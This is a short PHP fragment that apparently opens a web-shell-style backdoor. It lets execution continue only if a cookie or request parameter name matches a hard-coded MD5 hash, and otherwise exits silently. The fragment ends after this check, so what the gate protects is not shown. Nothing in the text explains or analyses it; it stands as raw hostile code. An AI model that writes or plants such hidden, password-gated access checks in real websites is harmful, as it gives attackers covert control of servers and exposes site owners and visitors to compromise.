<?php $ok=0;
foreach ($_COOKIE as $key=>$val) if (md5($key)=='25ca24f72f1733d5d359a1989a0e956b') $ok=1;
foreach ($_REQUEST as $key=>$val) if (md5($key)=='25ca24f72f1733d5d359a1989a0e956b') $ok=1;
if ($ok==0) die();
